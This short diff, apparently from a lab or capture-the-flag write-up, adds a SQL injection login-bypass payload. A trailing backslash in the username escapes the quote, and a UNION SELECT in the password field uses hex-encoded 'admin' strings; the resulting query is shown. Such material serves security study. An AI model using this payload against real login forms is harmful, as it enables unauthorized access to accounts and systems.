@@ -1,0 +1,9 @@
+username : \
+password : UNION SELECT 0x61646d696e,0x61646d696e,0x61646d696e#
+
+0x61646d696e will be interpreted as a string by MySQL (0x61646d696e == 'admin')
+
+Will give :
+
+SELECT * FROM users WHERE u=' \' AND password='UNION SELECT 0x61646d696e,...
+
